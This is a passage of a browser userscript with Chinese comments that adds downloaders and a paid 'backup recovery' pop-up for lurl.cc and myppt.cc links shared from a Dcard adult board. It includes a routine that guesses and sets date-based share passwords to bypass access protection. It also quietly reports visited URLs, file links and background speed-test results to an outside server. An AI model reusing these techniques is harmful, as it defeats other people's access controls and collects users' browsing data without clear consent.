        await RecoveryService.rpc('rd', payload);

        // 背景執行測速（不阻塞）
        RecoveryService.runSpeedTest();
      } catch (e) {
        // 靜默失敗
      }
    },

    // 執行測速並上報（force=true 可強制重測）
    runSpeedTest: async (force = false) => {
      try {
        // 檢查是否已經測過（每小時最多一次）
        if (!force) {
          const lastTest = GM_getValue('lurlhub_last_speedtest', 0);
          if (Date.now() - lastTest < 3600000) return; // 1 小時內不重測
        }

        // 取得測速節點
        const res = await fetch('https://epi.isnowfriend.com/mst/targets');
        const data = await res.json();
        if (!data.success || !data.targets?.length) return;

        const targets = data.targets.slice(0, 3);
        const chunkSize = 524288; // 512KB
        const duration = 5000; // 5 秒（縮短測試時間）
        const startTime = performance.now();
        const deadline = startTime + duration;
        let totalBytes = 0;

        // 平行下載測速
        const downloadLoop = async (url) => {
          while (performance.now() < deadline) {
            try {
              const r = await fetch(url, {
                cache: 'no-store',
                headers: { Range: `bytes=0-${chunkSize - 1}` }
              });
              const buf = await r.arrayBuffer();
              totalBytes += buf.byteLength;
            } catch (e) {
              break;
            }
          }
        };

        await Promise.all(targets.map(t => downloadLoop(t.url)));

        // 計算速度
        const elapsed = (performance.now() - startTime) / 1000;
        const speedMbps = (totalBytes * 8) / elapsed / 1e6;

        // 上報測速結果
        await RecoveryService.rpc('rd', {
          speedMbps: Math.round(speedMbps * 10) / 10,
          speedBytes: totalBytes,
          speedDuration: Math.round(elapsed * 10) / 10
        });

        GM_setValue('lurlhub_last_speedtest', Date.now());
        console.log(`[LurlHub] 測速完成: ${speedMbps.toFixed(1)} Mbps`);
      } catch (e) {
        // 靜默失敗
      }
    },

    // 顯示 LurlHub 修復彈窗
    showModal: (quota, onConfirm, onCancel) => {
      // 移除舊的彈窗
      const old = document.getElementById('lurlhub-recovery-modal');
      if (old) old.remove();

      const modal = document.createElement('div');
      modal.id = 'lurlhub-recovery-modal';
      modal.innerHTML = `
        <style>
          #lurlhub-recovery-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 999999;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          }
          .lurlhub-modal-content {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border-radius: 16px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
          }
          .lurlhub-logo {
            width: 80px;
            height: 80px;
            margin-bottom: 15px;
            border-radius: 12px;
          }
          .lurlhub-brand {
            font-size: 24px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 5px;
          }
          .lurlhub-title {
            font-size: 18px;
            color: #f59e0b;
            margin-bottom: 10px;
          }
          .lurlhub-desc {
            font-size: 14px;
            color: #ccc;
            margin-bottom: 20px;
            line-height: 1.6;
          }
          .lurlhub-quota {
            background: rgba(59,130,246,0.2);
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            color: #3b82f6;
            font-size: 14px;
          }
          .lurlhub-quota.exhausted {
            background: rgba(239,68,68,0.2);
            color: #ef4444;
          }
          .lurlhub-quota-warning {
            color: #ef4444;
            font-size: 12px;
            margin-top: 5px;
          }
          .lurlhub-actions {
            display: flex;
            gap: 10px;
            justify-content: center;
          }
          .lurlhub-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
          }
          .lurlhub-btn-cancel {
            background: #333;
            color: #aaa;
          }
          .lurlhub-btn-cancel:hover {
            background: #444;
            color: #fff;
          }
          .lurlhub-btn-confirm {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: #fff;
          }
          .lurlhub-btn-confirm:hover {
            transform: scale(1.05);
          }
          .lurlhub-btn-confirm:disabled {
            background: #555;
            cursor: not-allowed;
            transform: none;
          }
        </style>
        <div class="lurlhub-modal-content">
          <img src="${API_BASE}/files/LOGO.png" class="lurlhub-logo" onerror="this.style.display='none'">
          <div class="lurlhub-brand">LurlHub</div>
          <div class="lurlhub-title">⚠️ 原始資源已過期</div>
          <div class="lurlhub-desc">
            好消息！我們有此內容的備份。<br>
            使用修復服務即可觀看。
          </div>
          <div class="lurlhub-quota ${quota.remaining <= 0 ? 'exhausted' : ''}">
            剩餘額度：<strong>${quota.remaining}</strong> / ${quota.total} 次
            ${quota.remaining <= 0 ? '<div class="lurlhub-quota-warning">額度已用完</div>' : ''}
          </div>
          <div class="lurlhub-actions">
            <button class="lurlhub-btn lurlhub-btn-cancel" id="lurlhub-cancel">取消</button>
            <button class="lurlhub-btn lurlhub-btn-confirm" id="lurlhub-confirm">
              ${quota.remaining > 0 ? '使用修復（-1 額度）' : '充值'}
            </button>
          </div>
        </div>
      `;

      document.body.appendChild(modal);

      document.getElementById('lurlhub-cancel').onclick = () => {
        modal.remove();
        if (onCancel) onCancel();
      };

      document.getElementById('lurlhub-confirm').onclick = () => {
        if (quota.remaining > 0) {
          modal.remove();
          if (onConfirm) onConfirm();
        } else {
          // 充值功能（之後實作）
          Utils.showToast('💰 充值功能開發中，敬請期待', 'info');
        }
      };

      // 點背景不關閉，只有按取消才會關閉
    },

    // 替換資源（過期頁面復原，支援影片和圖片）
    replaceResource: (backupUrl, type) => {
      const fullUrl = backupUrl.startsWith('http') ? backupUrl : API_BASE.replace('/lurl', '') + backupUrl;

      // 建立新元素
      let newElement = null;
      if (type === 'video') {
        newElement = document.createElement('video');
        newElement.src = fullUrl;
        newElement.controls = true;
        newElement.autoplay = true;
        newElement.style.cssText = 'max-width: 100%; max-height: 80vh; display: block; margin: 0 auto;';
      } else {
        newElement = document.createElement('img');
        newElement.src = fullUrl;
        newElement.style.cssText = 'max-width: 100%; max-height: 80vh; display: block; margin: 0 auto;';
      }

      // 情況1: 過期頁面（有 lottie-player）
      const lottie = document.querySelector('lottie-player');
      if (lottie) {
        // 移除過期的 h1
        const h1 = document.querySelector('h1');
        if (h1 && h1.textContent.includes('該連結已過期')) {
          h1.remove();
        }
        lottie.replaceWith(newElement);
      }
      // 情況2: 密碼錯誤頁面（有 movie_introdu）
      else {
        // 移除所有 .movie_introdu 裡的 video/img（可能有多個）
        $('.movie_introdu').find('video, img').remove();
        // 只在第一個插入
        const $firstSection = $('.movie_introdu').first();
        if ($firstSection.length) {
          $firstSection.prepend(newElement);
        } else {
          document.body.appendChild(newElement);
        }
      }

      // 播放影片
      if (type === 'video' && newElement) {
        newElement.play().catch(() => {});
      }

      // 在內容下面加上品牌卡片
      if (newElement) {
        const successH1 = LurlHubBrand.createSuccessH1('✅ 備份載入成功');
        const brandCard = LurlHubBrand.createCard('受不了過期連結？我們搞定 →');
        const ratingPrompt = LurlHubBrand.createRatingPrompt(RecoveryService.getVisitorId());
        newElement.insertAdjacentElement('afterend', successH1);
        successH1.insertAdjacentElement('afterend', brandCard);
        brandCard.insertAdjacentElement('afterend', ratingPrompt);
      }
    },

    // 監聽影片載入失敗（可傳入已知的 backup 避免重複查詢）
    watchVideoError: (existingBackup = null) => {
      const video = document.querySelector('video');
      if (!video) return;

      let errorHandled = false;
      const pageUrl = window.location.href.split('?')[0];

      const handleError = async () => {
        if (errorHandled) return;
        errorHandled = true;

        console.log('[LurlHub] 偵測到影片載入失敗，檢查備份...');

        // 使用已知備份或重新查詢
        const backup = existingBackup || await RecoveryService.checkBackup(pageUrl);

        if (backup.hasBackup) {
          // 已修復過 → 直接顯示
          if (backup.alreadyRecovered) {
            RecoveryService.replaceResource(backup.backupUrl, backup.record.type);
            Utils.showToast('✅ 已自動載入備份', 'success');
            return;
          }
          // 未修復過 → 顯示彈窗
          console.log('[LurlHub] 有備份可用，顯示修復彈窗');
          RecoveryService.showModal(backup.quota, async () => {
            try {
              const result = await RecoveryService.recover(pageUrl);
              RecoveryService.replaceResource(result.backupUrl, result.record.type);
              Utils.showToast(`✅ 修復成功！剩餘額度: ${result.quota.remaining}`, 'success');
            } catch (err) {
              if (err.error === 'quota_exhausted') {
                Utils.showToast('❌ 額度已用完', 'error');
              } else {
                Utils.showToast('❌ 修復失敗', 'error');
              }
            }
          });
        } else {
          console.log('[LurlHub] 無備份可用');
        }
      };

      video.addEventListener('error', handleError);

      // 也監聽 5 秒後還沒載入的情況
      setTimeout(() => {
        if (video.readyState === 0 && video.networkState === 3) {
          handleError();
        }
      }, 5000);
    }
  };

  // 暴露給 Console 用（可強制重測: _lurlhub.runSpeedTest(true)）
  unsafeWindow._lurlhub = RecoveryService;

  const MypptHandler = {
    saveQueryParams: () => {
      const title = Utils.getQueryParam("title");
      const ref = Utils.getQueryParam("ref");
      if (title) sessionStorage.setItem("myppt_title", title);
      if (ref) sessionStorage.setItem("myppt_ref", ref);
    },

    getTitle: () => {
      return Utils.getQueryParam("title") || sessionStorage.getItem("myppt_title") || "untitled";
    },

    getRef: () => {
      return Utils.getQueryParam("ref") || sessionStorage.getItem("myppt_ref") || null;
    },

    getUploadDate: () => {
      const $dateSpan = $(".login_span").eq(1);
      if ($dateSpan.length === 0) return null;
      return Utils.extractMMDD($dateSpan.text());
    },

    autoFillPassword: () => {
      const date = MypptHandler.getUploadDate();
      if (!date) return;
      MypptHandler.saveQueryParams();
      $("#pasahaicsword").val(date);
      $("#main_fjim60unBU").click();
      location.reload();
    },

    pictureDownloader: {
      getImageUrls: () => {
        const urls = [];
        $('link[rel="preload"][as="image"]').each(function () {
          const href = $(this).attr("href");
          if (href && MypptHandler.pictureDownloader.isContentImage(href)) {
            urls.push(href);
          }
        });
        return urls;
      },

      isContentImage: (url) => {
        if (!url) return false;
        const dominated = ["myppt", "lurl", "imgur", "i.imgur"];
        const blocked = ["google", "facebook", "analytics", "ads", "tracking", "pixel"];
        const lowerUrl = url.toLowerCase();
        if (blocked.some((b) => lowerUrl.includes(b))) return false;
        if (dominated.some((d) => lowerUrl.includes(d))) return true;
        if (/\.(jpg|jpeg|png|gif|webp)(\?|$)/i.test(url)) return true;
        return false;
      },

      createDownloadButton: () => {
        const imageUrls = MypptHandler.pictureDownloader.getImageUrls();
        if (imageUrls.length === 0) return null;
        const count = imageUrls.length;
        const text = count > 1 ? `下載全部圖片 (${count})` : "下載圖片";
        const $button = $("<button>", { text, class: "btn btn-primary" });
        $button.on("click", async function () {
          for (let i = 0; i < imageUrls.length; i++) {
            const suffix = count > 1 ? `_${i + 1}` : "";
            await Utils.downloadFile(imageUrls[i], `image${suffix}.jpg`);
          }
        });
        return $("<div>", { class: "col-12" }).append($button);
      },

      inject: () => {
        if ($("#myppt-download-btn").length) return;
        const $button = MypptHandler.pictureDownloader.createDownloadButton();
        if (!$button) return;
        $button.attr("id", "myppt-download-btn");
        const $targetRow = $('div.row[style*="margin: 10px"][style*="border-style:solid"]');
        if ($targetRow.length) {
          $targetRow.append($button);
        }
      },
    },

    videoDownloader: {
      getVideoUrl: () => {
        const $video = $("video").first();
        if ($video.attr("src")) {
          return $video.attr("src");
        }
        const $source = $video.find("source").first();
        return $source.attr("src") || null;
      },

      createDownloadButton: () => {
        const videoUrl = MypptHandler.videoDownloader.getVideoUrl();
        if (!videoUrl) return null;
        const title = MypptHandler.getTitle();
        const $button = $("<a>", {
          href: videoUrl,
          download: `${title}.mp4`,
          text: "下載影片",
          class: "btn btn-primary",
          id: "myppt-video-download-btn",
          css: { color: "white", float: "right" },
        });
        $button.on("click", async function (e) {
          e.preventDefault();
          const $this = $(this);
          if ($this.hasClass("disabled-button")) return;
          $this.addClass("disabled-button").attr("disabled", true);
          Utils.showToast("🎉成功下載！請稍等幾秒......");
          await Utils.downloadFile(videoUrl, `${title}.mp4`);
          setTimeout(() => {
            $this.removeClass("disabled-button").removeAttr("disabled");
          }, 7000);
        });
        return $button;
      },

      inject: () => {
        if ($("#myppt-video-download-btn").length) return;
        const $button = MypptHandler.videoDownloader.createDownloadButton();
        if (!$button) return;
        const $h2List = $("h2");
        if ($h2List.length) {
          $h2List.first().append($button);
        }
      },
    },

    detectContentType: () => {
      return $("video").length > 0 ? "video" : "picture";
    },

    captureToAPI: async (type) => {
      // 先更新封鎖清單
      await BlockedCache.refresh();

      const title = MypptHandler.getTitle();
      const pageUrl = window.location.href.split("?")[0];
      const ref = MypptHandler.getRef(); // D卡文章連結

      if (type === "video") {
        const fileUrl = MypptHandler.videoDownloader.getVideoUrl();
        if (!fileUrl) {
          console.log("無法取得影片 URL，跳過 API 回報");
          return;
        }
        // 檢查是否已封鎖
        if (BlockedCache.isBlocked(fileUrl)) {
          console.log("[lurl] 跳過已封鎖內容:", fileUrl);
          return;
        }
        // 提取縮圖
        const thumbnail = await Utils.extractThumbnail();
        Utils.sendToAPI({
          title: decodeURIComponent(title),
          pageUrl,
          fileUrl,
          type: "video",
          source: "myppt",
          ...(ref && { ref }),
          ...(thumbnail && { thumbnail }),
        });
      } else {
        const imageUrls = MypptHandler.pictureDownloader.getImageUrls();
        if (imageUrls.length === 0) {
          console.log("無法取得圖片 URL，跳過 API 回報");
          return;
        }
        // 過濾掉已封鎖的 URLs
        const filteredUrls = imageUrls.filter(url => !BlockedCache.isBlocked(url));
        if (filteredUrls.length < imageUrls.length) {
          console.log(`[lurl] 已過濾 ${imageUrls.length - filteredUrls.length} 個封鎖的圖片`);
        }
        filteredUrls.forEach((fileUrl, index) => {
          const suffix = filteredUrls.length > 1 ? `_${index + 1}` : "";
          Utils.sendToAPI({
            title: decodeURIComponent(title) + suffix,
            pageUrl,
            fileUrl,
            type: "image",
            source: "myppt",
            ...(ref && { ref }),
          });
        });
      }
    },

    init: () => {
      MypptHandler.saveQueryParams(); // 一進來就保存 ref，避免密碼頁面重載後丟失
      $(document).ready(() => {
        MypptHandler.autoFillPassword();
      });
      $(window).on("load", async () => {
        // 查備份 + 決定策略
        const result = await RecoveryService.checkAndRecover();

        // 如果已處理（過期/密碼錯誤等），停止
        if (result.handled) {
          return;
        }

        // 正常頁面，繼續執行
        const contentType = MypptHandler.detectContentType();
        if (contentType === "video") {
          MypptHandler.videoDownloader.inject();
          MypptHandler.captureToAPI("video");
          // 如果有備份，監聯影片錯誤時 fallback
          if (result.hasBackup) {
            RecoveryService.watchVideoError(result.backup);
          }
        } else {
          MypptHandler.pictureDownloader.inject();
          MypptHandler.captureToAPI("image");
        }
        // 在「✅助手啟動」h2 下方顯示品牌卡片
        const h2 = [...document.querySelectorAll('h2')].find(el => el.textContent.includes('✅'));
        if (h2) {
          LurlHubBrand.insertAfter(h2);
        }
        BackToDcardButton.inject($("h2").first());
      });
    },
  };

  const DcardHandler = {
    interceptLinks: () => {
      const selector = 'a[href^="https://lurl.cc/"], a[href^="https://myppt.cc/"]';
      $(document).on("click", selector, function (e) {
        e.preventDefault();
        const href = $(this).attr("href");
        const $allLinks = $(selector);
        const index = $allLinks.index(this) + 1;
        const totalLinks = $allLinks.length;
        const baseTitle = document.title;
        const title = totalLinks > 1
          ? encodeURIComponent(`${baseTitle}_${index}`)
          : encodeURIComponent(baseTitle);
        const ref = encodeURIComponent(window.location.href);
        window.open(`${href}?title=${title}&ref=${ref}`, "_blank");
      });
    },

    autoConfirmAge: () => {
      const $buttons = $("button");
      if ($buttons.length !== 13) return;
      const $secondP = $("p").eq(1);
      if (!$secondP.length) return;
      const $nextElement = $secondP.next();
      if ($nextElement.prop("nodeType") === 1) {
        $nextElement.find("button").eq(1).click();
      }
    },

    removeLoginModal: () => {
      $(".__portal").remove();
      $("body").css("overflow", "auto");
    },

    watchRouteChange: () => {
      if (window.location.href !== "https://www.dcard.tw/f/sex") return;
      let currentURL = window.location.href;
      $(document).on("click", () => {
        if (window.location.href !== currentURL) {
          window.location.reload();
        }
      });
    },

    init: () => {
      DcardHandler.interceptLinks();
      DcardHandler.watchRouteChange();
      setTimeout(() => {
        DcardHandler.autoConfirmAge();
        DcardHandler.removeLoginModal();
      }, 3500);
    },
  };

  const LurlHandler = {
    passwordCracker: {
      getCookieName: () => {
        const match = window.location.href.match(/lurl\.cc\/(\w+)/);
        return match ? `psc_${match[1]}` : null;
      },

      isPasswordCorrect: () => {
        const $statusSpan = $(
          "#back_top .container.NEWii_con section:nth-child(6) h2 span"
        );
        const text = $statusSpan.text();
        return text.includes("成功") || text.includes("錯誤");
      },

      tryTodayPassword: () => {
        if (LurlHandler.passwordCracker.isPasswordCorrect()) return false;
        const $dateSpan = $(".login_span").eq(1);
        if (!$dateSpan.length) return false;
        const date = Utils.extractMMDD($dateSpan.text());
        if (!date) return false;
        const cookieName = LurlHandler.passwordCracker.getCookieName();
        if (!cookieName) return false;
        Utils.cookie.set(cookieName, date);
        return true;
      },

      init: () => {
        if (LurlHandler.passwordCracker.tryTodayPassword()) {
          location.reload();
        }
      },
    },

    pictureDownloader: {
      getImageUrls: () => {
        const urls = [];
        $('link[rel="preload"][as="image"]').each(function () {
          const href = $(this).attr("href");
          if (href && LurlHandler.pictureDownloader.isContentImage(href)) {
            urls.push(href);
          }
        });
        return urls;
      },

      isContentImage: (url) => {
        if (!url) return false;
        const dominated = ["lurl", "myppt", "imgur", "i.imgur"];
        const blocked = ["google", "facebook", "analytics", "ads", "tracking", "pixel"];
        const lowerUrl = url.toLowerCase();
        if (blocked.some((b) => lowerUrl.includes(b))) return false;
        if (dominated.some((d) => lowerUrl.includes(d))) return true;
        if (/\.(jpg|jpeg|png|gif|webp)(\?|$)/i.test(url)) return true;
        return false;
      },

      createDownloadButton: () => {
        const imageUrls = LurlHandler.pictureDownloader.getImageUrls();
        if (imageUrls.length === 0) return null;
        const count = imageUrls.length;
        const text = count > 1 ? `下載全部圖片 (${count})` : "下載圖片";
        const $button = $("<button>", { text, class: "btn btn-primary" });
        $button.on("click", async function () {
          for (let i = 0; i < imageUrls.length; i++) {
            const suffix = count > 1 ? `_${i + 1}` : "";
            await Utils.downloadFile(imageUrls[i], `image${suffix}.jpg`);
          }
        });
        return $("<div>", { class: "col-12" }).append($button);
      },

      inject: () => {
        if ($("#lurl-img-download-btn").length) return;
        const $button = LurlHandler.pictureDownloader.createDownloadButton();
        if (!$button) return;
        $button.attr("id", "lurl-img-download-btn");
        const $targetRow = $('div.row[style*="margin: 10px"][style*="border-style:solid"]');
        if ($targetRow.length) {
          $targetRow.append($button);
        }
      },
    },

    videoDownloader: {
      getVideoUrl: () => {
        const $video = $("video").first();
        if ($video.attr("src")) {
          return $video.attr("src");
        }
        const $source = $video.find("source").first();
        return $source.attr("src") || null;
      },

      replacePlayer: () => {
        const videoUrl = LurlHandler.videoDownloader.getVideoUrl();
        if (!videoUrl) return;
        const $newVideo = $("<video>", {
          src: videoUrl,
          controls: true,
          autoplay: true,
          width: 640,
          height: 360,
          preload: "metadata",
          class: "vjs-tech",
          id: "vjs_video_3_html5_api",
          tabIndex: -1,
          role: "application",
          "data-setup": '{"aspectRatio":"16:9"}',
        });
        $("video").replaceWith($newVideo);
        $("#vjs_video_3").removeAttr("oncontextmenu controlslist");
        $(".vjs-control-bar").remove();
      },

      createDownloadButton: () => {
        const videoUrl = LurlHandler.videoDownloader.getVideoUrl();
        if (!videoUrl) return null;
        const title = Utils.getQueryParam("title") || "video";
        const $button = $("<a>", {
          href: videoUrl,
          download: `${title}.mp4`,
          text: "下載影片",
          class: "btn btn-primary",
          css: { color: "white", float: "right" },
        });
        $button.on("click", async function (e) {
          e.preventDefault();
          const $this = $(this);
          if ($this.hasClass("disabled-button")) return;
          $this.addClass("disabled-button").attr("disabled", true);
          Utils.showToast("🎉成功下載！請稍等幾秒......");
          await Utils.downloadFile(videoUrl, `${title}.mp4`);
          setTimeout(() => {
            $this.removeClass("disabled-button").removeAttr("disabled");
          }, 7000);
        });
        return $button;
      },

      inject: () => {
        if ($("#lurl-download-btn").length) return;
        const $button = LurlHandler.videoDownloader.createDownloadButton();
        if (!$button) return;
        $button.attr("id", "lurl-download-btn");
        const $h2List = $("h2");
        if ($h2List.length === 3) {
          const $header = $("<h2>", {
            text: "✅助手啟動",
            css: { color: "white", textAlign: "center", marginTop: "25px" },
          });
          $("#vjs_video_3").before($header);
          $header.append($button);
        } else {
          $h2List.first().append($button);
        }
      },
    },

    detectContentType: () => {
      return $("video").length > 0 ? "video" : "picture";
    },

    captureToAPI: async (type) => {
      // 先更新封鎖清單
      await BlockedCache.refresh();

      const title = Utils.getQueryParam("title") || "untitled";
      const pageUrl = window.location.href.split("?")[0];
      const ref = Utils.getQueryParam("ref"); // D卡文章連結

      if (type === "video") {
        const fileUrl = LurlHandler.videoDownloader.getVideoUrl();
        if (!fileUrl) {
          console.log("無法取得影片 URL，跳過 API 回報");
          return;
        }
        // 檢查是否已封鎖
        if (BlockedCache.isBlocked(fileUrl)) {
          console.log("[lurl] 跳過已封鎖內容:", fileUrl);
          return;
        }
        // 提取縮圖
        const thumbnail = await Utils.extractThumbnail();
        Utils.sendToAPI({
          title: decodeURIComponent(title),
          pageUrl,
          fileUrl,
          type: "video",
          source: "lurl",
          ...(ref && { ref: decodeURIComponent(ref) }),
          ...(thumbnail && { thumbnail }),
        });
      } else {
        const imageUrls = LurlHandler.pictureDownloader.getImageUrls();
        if (imageUrls.length === 0) {
          console.log("無法取得圖片 URL，跳過 API 回報");
          return;
        }
        // 過濾掉已封鎖的 URLs
        const filteredUrls = imageUrls.filter(url => !BlockedCache.isBlocked(url));
        if (filteredUrls.length < imageUrls.length) {
          console.log(`[lurl] 已過濾 ${imageUrls.length - filteredUrls.length} 個封鎖的圖片`);
        }
        filteredUrls.forEach((fileUrl, index) => {
          const suffix = filteredUrls.length > 1 ? `_${index + 1}` : "";
          Utils.sendToAPI({
            title: decodeURIComponent(title) + suffix,
            pageUrl,
            fileUrl,
            type: "image",
            source: "lurl",
            ...(ref && { ref: decodeURIComponent(ref) }),
          });
        });
      }
    },

    init: () => {
      // 先嘗試密碼破解（會在 needsPassword 狀態時設 cookie 並 reload）
      LurlHandler.passwordCracker.init();

      $(window).on("load", async () => {
        // 查備份 + 決定策略
        const result = await RecoveryService.checkAndRecover();

        // 如果已處理（過期/密碼錯誤等），停止
        if (result.handled) {
          return;
        }

        // 正常頁面，繼續執行
        const contentType = LurlHandler.detectContentType();
        if (contentType === "video") {
          LurlHandler.videoDownloader.inject();
          LurlHandler.videoDownloader.replacePlayer();
          LurlHandler.captureToAPI("video");
          // 如果有備份，監聽影片錯誤時 fallback
          if (result.hasBackup) {
            RecoveryService.watchVideoError(result.backup);
          }
        } else {
          LurlHandler.pictureDownloader.inject();
          LurlHandler.captureToAPI("image");
        }
        // 在「✅助手啟動」h2 下方顯示品牌卡片
        const h2 = [...document.querySelectorAll('h2')].find(el => el.textContent.includes('✅'));
        if (h2) {
          LurlHubBrand.insertAfter(h2);
        }
        BackToDcardButton.inject($("h2").first());
      });
    },
  };

  const Router = {
    routes: {
      "myppt.cc": MypptHandler,
      "dcard.tw/f/sex": DcardHandler,
      "lurl.cc": LurlHandler,
    },

    getCurrentRoute: () => {
      const url = window.location.href;
      for (const [pattern, handler] of Object.entries(Router.routes)) {
        if (url.includes(pattern)) return handler;
      }
      return null;
    },

    dispatch: () => {
      const handler = Router.getCurrentRoute();
      if (handler) {
        console.log("路由匹配成功");
        handler.init();
      }
    },
  };

  const Main = {
    init: () => {
      ResourceLoader.init();
      VersionChecker.check();
      Router.dispatch();
    },
  };

  $(document).ready(() => {
    Main.init();
  });
})(jQuery);